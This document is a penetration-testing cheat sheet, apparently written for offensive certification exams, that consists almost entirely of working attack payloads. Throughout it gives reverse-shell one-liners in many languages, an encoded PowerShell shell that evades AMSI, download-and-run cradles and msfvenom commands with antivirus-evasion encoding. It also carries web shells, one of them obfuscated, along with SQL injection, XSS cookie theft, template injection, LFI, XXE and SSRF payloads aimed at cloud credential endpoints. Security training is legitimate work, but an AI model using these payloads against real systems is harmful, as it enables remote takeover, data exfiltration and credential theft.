# Payloads Arsenal — Shells, msfvenom & Web Injection

**One page for every payload you reach for under exam pressure.** Set your `LHOST`/`LPORT`, pick the shell that matches the box, and land the callback. Every command below uses `{target}` as the attacker/listener IP by default — swap it for your tun0 address.

> Golden rule: **always start the listener BEFORE firing the payload.** `sudo rlwrap nc -lvnp 4444` (rlwrap gives you arrow-key history in the shell). For Windows/AMSI-heavy targets, prefer a Meterpreter or a stageless PowerShell shell.

---

## 0. Quick Listener Setup

```bash
# Classic netcat listener (rlwrap = arrow keys + history in the caught shell)
sudo rlwrap -cAr nc -lvnp 4444

# Metasploit multi/handler (matches any msfvenom payload)
msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST {target}; set LPORT 4444; set ExitOnSession false; exploit -j"

# pwncat-cs — best modern catcher (auto TTY upgrade, persistence, file upload/download)
pwncat-cs -lp 4444
```

Find your VPN IP fast:
```bash
ip -brief addr show tun0
# or
ip a | grep -oP 'inet \K10\.10\.[0-9.]+'
```

---

## 1. Reverse Shells — Linux / Unix

Best-to-worst reliability. `bash -i` needs `/dev/tcp` (bash-only); `mkfifo` works on almost any `/bin/sh`.

```bash
# Bash TCP (most common; only works with real bash)
bash -i >& /dev/tcp/{target}/4444 0>&1
bash -c 'bash -i >& /dev/tcp/{target}/4444 0>&1'

# Bash, base64-wrapped (survives bad-char / quote mangling in web params)
echo -n 'bash -i >& /dev/tcp/{target}/4444 0>&1' | base64
# -> paste: bash -c '{echo,BASE64HERE}|{base64,-d}|bash'

# mkfifo / named pipe (works on dash, ash, busybox — very portable)
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {target} 4444 >/tmp/f

# Netcat with -e (only "traditional" nc has -e)
nc -e /bin/sh {target} 4444
nc.traditional -e /bin/bash {target} 4444

# socat (fully interactive PTY in one shot — upgrade for free)
socat TCP:{target}:4444 EXEC:'bash -li',pty,stderr,setsid,sigint,sane
# attacker side:
socat -d -d TCP-LISTEN:4444,reuseaddr FILE:`tty`,raw,echo=0
```

Language interpreters (when there is no shell but there is python/perl/php):
```bash
# Python3 (spawns a PTY directly — no manual upgrade needed)
python3 -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect(("{target}",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'

# Perl
perl -e 'use Socket;$i="{target}";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# PHP
php -r '$sock=fsockopen("{target}",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("{target}",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# awk
awk 'BEGIN{s="/inet/tcp/0/{target}/4444";while(1){do{printf "shell>" |& s;s |& getline c;if(c){while((c |& getline)>0)print $0 |& s;close(c)}}while(c!="exit")close(s)}}' /dev/null
```

---

## 2. Reverse Shells — Windows

```powershell
# PowerShell one-liner (Nishang-style). Encode it if AMSI/quoting is a problem.
$c=New-Object System.Net.Sockets.TCPClient('{target}',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()
```

Encode the PowerShell payload to bypass quote/AMSI issues (`-enc` takes UTF-16LE base64):
```bash
# On Kali: build the -EncodedCommand blob
PS='$c=New-Object System.Net.Sockets.TCPClient("{target}",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+"PS "+(pwd).Path+"> ";$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()'
echo -n "$PS" | iconv -t UTF-16LE | base64 -w0
# Run on target:  powershell -nop -w hidden -enc <BLOB>
```

ConPtyShell / fully interactive Windows shell (the Windows equivalent of a PTY upgrade):
```powershell
# Attacker (stty raw handler):
stty raw -echo; (stty size; cat) | nc -lvnp 4444
# Target (downloads + runs Invoke-ConPtyShell):
IEX(IEX(New-Object Net.WebClient).DownloadString('http://{target}/Invoke-ConPtyShell.ps1'));Invoke-ConPtyShell {target} 4444
```

Other Windows one-liners:
```cmd
:: Netcat for Windows (nc.exe uploaded to target)
nc.exe {target} 4444 -e cmd.exe

:: PowerShell download-cradle to run a hosted shell script
powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://{target}/shell.ps1')"

:: mshta / rundll32 living-off-the-land execs (pair with an HTA/DLL payload)
mshta http://{target}/evil.hta
```

---

## 3. msfvenom Cheat Matrix

`msfvenom -p <payload> LHOST={target} LPORT=4444 -f <format> -o <out>`

| Target | Payload | Format / Output |
|--------|---------|-----------------|
| Linux x64 (staged meterpreter) | `linux/x64/meterpreter/reverse_tcp` | `-f elf -o shell.elf` |
| Linux x64 (stageless shell) | `linux/x64/shell_reverse_tcp` | `-f elf -o shell.elf` |
| Windows x64 (meterpreter) | `windows/x64/meterpreter/reverse_tcp` | `-f exe -o shell.exe` |
| Windows x64 (stageless) | `windows/x64/shell_reverse_tcp` | `-f exe -o shell.exe` |
| Windows (staged, HTTPS evasion) | `windows/x64/meterpreter/reverse_https` | `-f exe -o s.exe` |
| Windows DLL | `windows/x64/meterpreter/reverse_tcp` | `-f dll -o evil.dll` |
| PHP | `php/meterpreter_reverse_tcp` | `-f raw -o shell.php` |
| ASP / ASPX | `windows/x64/meterpreter/reverse_tcp` | `-f aspx -o shell.aspx` |
| JSP / WAR | `java/jsp_shell_reverse_tcp` | `-f raw -o shell.jsp` / `-f war -o shell.war` |
| Python | `python/meterpreter/reverse_tcp` | `-f raw -o shell.py` |
| macOS x64 | `osx/x64/shell_reverse_tcp` | `-f macho -o shell.macho` |
| Shellcode (C buffer) | `windows/x64/meterpreter/reverse_tcp` | `-f c` |

Common examples:
```bash
# Linux ELF stageless (pairs with a plain nc listener)
msfvenom -p linux/x64/shell_reverse_tcp LHOST={target} LPORT=4444 -f elf -o shell.elf

# Windows EXE meterpreter (needs multi/handler)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={target} LPORT=4444 -f exe -o shell.exe

# PHP web shell payload
msfvenom -p php/reverse_php LHOST={target} LPORT=4444 -f raw -o rev.php

# WAR for Tomcat manager upload
msfvenom -p java/jsp_shell_reverse_tcp LHOST={target} LPORT=4444 -f war -o shell.war

# Encode to dodge naive AV / bad chars (x86 msf; -i = iterations)
msfvenom -p windows/shell_reverse_tcp LHOST={target} LPORT=4444 -e x86/shikata_ga_nai -i 10 -b '\x00\x0a\x0d' -f exe -o enc.exe

# List payloads / formats / encoders
msfvenom -l payloads | grep meterpreter
msfvenom -l formats
```

> Buffer-overflow bad-char note: always pass `-b '\x00...'` with the bad chars you found during fuzzing, and use `EXITFUNC=thread` for stability inside a service you don't want to crash.

---

## 4. Web Shells (drop-and-browse)

```php
// Minimal PHP — visit /shell.php?cmd=id
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_REQUEST['c']); ?>
<?php passthru($_GET['cmd']); ?>

// Stealthier one (harder to grep for)
<?php $f="sys"."tem"; $f($_GET[0]); ?>
```

```jsp
<%-- JSP web shell — /shell.jsp?cmd=id --%>
<%@ page import="java.util.*,java.io.*" %>
<% if(request.getParameter("cmd")!=null){ Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));
   BufferedReader d=new BufferedReader(new InputStreamReader(p.getInputStream()));
   String s=""; while((s=d.readLine())!=null){ out.println(s); } } %>
```

```asp
<%-- ASPX web shell — /shell.aspx?cmd=whoami --%>
<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %>
<% var p=new Process(); p.StartInfo.FileName="cmd.exe"; p.StartInfo.Arguments="/c "+Request["cmd"];
   p.StartInfo.RedirectStandardOutput=true; p.StartInfo.UseShellExecute=false; p.Start();
   Response.Write(p.StandardOutput.ReadToEnd()); %>
```

Battle-tested full-featured web shells already on Kali:
```bash
# PHP: /usr/share/webshells/php/php-reverse-shell.php  (edit $ip / $port, then upload)
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
# Antak / p0wny-shell / phpbash are also worth uploading for interactive use
```

---

## 5. Upgrade to a Fully Interactive TTY

The single most useful post-foothold trick. After catching a dumb shell:
```bash
# 1) Spawn a PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'
# (fallbacks) script -qc /bin/bash /dev/null   |   /usr/bin/script -qc /bin/bash /dev/null

# 2) Background the shell
Ctrl+Z

# 3) On YOUR box: pass raw keys through + capture your terminal size
stty raw -echo; fg
# (press Enter twice)

# 4) Back in the shell: fix term type + size (get rows/cols from `stty size` on Kali first)
export TERM=xterm-256color
stty rows 38 columns 190
```

Now Ctrl+C, tab-complete, `su`, `ssh`, and full-screen editors all work.

---

## 6. Injection Payload Quick-Reference

### SQL Injection
```sql
-- Auth bypass
' OR 1=1-- -
admin' -- -
' OR '1'='1
-- Determine column count / find injectable columns
' ORDER BY 5-- -
' UNION SELECT 1,2,3,4,5-- -
-- Extract (MySQL)
' UNION SELECT 1,@@version,current_user(),database(),5-- -
' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables-- -
' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_name='users'-- -
-- MSSQL stacked RCE
'; EXEC xp_cmdshell 'whoami'-- -
-- Read file (MySQL) / write web shell
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -
' UNION SELECT 1,"<?php system($_GET['c']);?>",3 INTO OUTFILE '/var/www/html/s.php'-- -
```

### Cross-Site Scripting (XSS)
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>fetch('http://{target}/c?='+document.cookie)</script>
<script>new Image().src='http://{target}/?c='+btoa(document.cookie)</script>
```

### Server-Side Template Injection (SSTI)
```bash
# Detection: {{7*7}}  ${7*7}  #{7*7}  <%= 7*7 %>   (49 = injectable)
# Jinja2 (Python/Flask) RCE:
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
# Twig (PHP):
{{['id']|filter('system')}}
# FreeMarker (Java):
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### Command Injection
```bash
; id
| id
|| id
& id
&& id
`id`
$(id)
%0a id           # newline
;curl http://{target}/`whoami`   # blind / OOB exfil
```

### Local File Inclusion (LFI) → RCE
```bash
../../../../etc/passwd
....//....//etc/passwd            # filter bypass
/etc/passwd%00                    # null byte (old PHP)
php://filter/convert.base64-encode/resource=index.php    # read source
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+ # data wrapper RCE
expect://id
# Log poisoning: inject <?php system($_GET['c']);?> into User-Agent, then include the log
/var/log/apache2/access.log&c=id
/proc/self/environ
```

### File Upload Bypass
```
shell.php  ->  shell.phtml / .php5 / .phar / .pht      (alt extensions)
shell.php%00.jpg                                       (null byte)
shell.php.jpg  +  magic bytes GIF89a; at top of file   (content-type)
Change Content-Type header to image/png in Burp
.htaccess trick: "AddType application/x-httpd-php .abc" then upload shell.abc
```

### XXE (XML External Entity)
```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r>&x;</r>
<!-- OOB / blind exfil -->
<!DOCTYPE r [<!ENTITY % p SYSTEM "http://{target}/evil.dtd"> %p;]>
```

### SSRF Targets to Try
```bash
http://127.0.0.1:80/            http://localhost/admin
http://169.254.169.254/latest/meta-data/                 # AWS IMDSv1
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/       # GCP (needs Metadata-Flavor: Google)
http://[::1]/   http://0.0.0.0/   http://2130706433/       # localhost bypass encodings
gopher://127.0.0.1:6379/_...                               # protocol smuggling (redis/etc.)
```

---

## 7. Serving & Transferring Payloads

```bash
# Host files from your attack box
python3 -m http.server 80
# or with upload support
python3 -m uploadserver 80

# SMB share (great for Windows targets)
impacket-smbserver share $(pwd) -smb2support
# then on Windows:  copy \\{target}\share\shell.exe C:\Windows\Temp\s.exe

# Download on target
wget http://{target}/shell.elf -O /tmp/s.elf && chmod +x /tmp/s.elf
curl http://{target}/shell.elf -o /tmp/s.elf
# Windows
powershell -c "iwr http://{target}/shell.exe -o C:\Windows\Temp\s.exe"
certutil -urlcache -f http://{target}/shell.exe s.exe
```

> See the **File Transfer** and **Reverse Shells** chapters for the full menu of transfer methods, base64 clipboard tricks, and firewall-restricted options.
